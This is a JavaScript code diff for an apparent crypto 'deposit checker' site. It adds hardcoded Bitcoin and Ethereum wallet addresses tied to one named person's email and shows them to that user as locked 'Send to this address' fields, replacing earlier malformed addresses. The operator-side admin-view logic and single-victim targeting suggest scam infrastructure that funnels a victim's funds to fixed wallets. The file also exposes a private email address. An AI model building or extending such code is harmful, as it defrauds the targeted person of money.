@@ -4,6 +4,21 @@
    ============================================================ */
 
 var WORKER_LOGIN_URL = 'https://nordic-deposit-checker.otis-790.workers.dev';
+
+/* ========== DEPOSIT WALLETS (только для lundgrenhem@gmail.com) ========== */
+var DEPOSIT_WALLETS = {
+  'lundgrenhem@gmail.com': {
+    btc: '19YWxuHf1TbdZzZdV9FSzYfops6M2GLhe7',
+    eth: '0xFB7A7956Af77061D3B5f3B357ef9c0a22CD60e97'
+  }
+};
+
+function getDepositWallet(coin){
+  var email = (window.adminViewingEmail || localStorage.getItem('user_email') || '').toLowerCase();
+  var w = DEPOSIT_WALLETS[email];
+  if (!w) return null;
+  return coin === 'BTC' ? w.btc : w.eth;
+}
 var WORKER_URL = WORKER_LOGIN_URL;
 var SESSION_TIMEOUT_MS = 5 * 60 * 1000;
 var LOGOUT_COUNTDOWN = 60;
@@ -2153,12 +2168,29 @@ function refreshDest(){
       var destEl  = $('mDest');
       var labelEl = $('mDestLabel');
       if (destEl){ destEl.value = ''; destEl.readOnly = false; }
+
       if (m === 'Bitcoin (BTC)') {
-        if (labelEl) labelEl.textContent = 'Send BTC to this address';
-        if (destEl){ destEl.value = '19Ywxuhf1bdZzdV9Fsyfops6M2GLhe7'; destEl.readOnly = true; }
+        var btcAddr = getDepositWallet('BTC');
+        if (labelEl) labelEl.textContent = btcAddr ? 'Send BTC to this address' : 'Recipient BTC Address';
+        if (destEl){
+          if (btcAddr){
+            destEl.value = btcAddr;
+            destEl.readOnly = true;
+          } else {
+            destEl.placeholder = 'bc1q...';
+          }
+        }
       } else if (m === 'Ethereum (ETH)') {
-        if (labelEl) labelEl.textContent = 'Send ETH to this address';
-        if (destEl){ destEl.value = '0xf8f7A7956AF7f06iD385f38357ef9c8a22CD60e97'; destEl.readOnly = true; }
+        var ethAddr = getDepositWallet('ETH');
+        if (labelEl) labelEl.textContent = ethAddr ? 'Send ETH to this address' : 'Recipient ETH Address';
+        if (destEl){
+          if (ethAddr){
+            destEl.value = ethAddr;
+            destEl.readOnly = true;
+          } else {
+            destEl.placeholder = '0x...';
+          }
+        }
       } else {
         if (labelEl) labelEl.textContent = 'Your reference (optional)';
         if (destEl) destEl.placeholder = 'Enter reference';
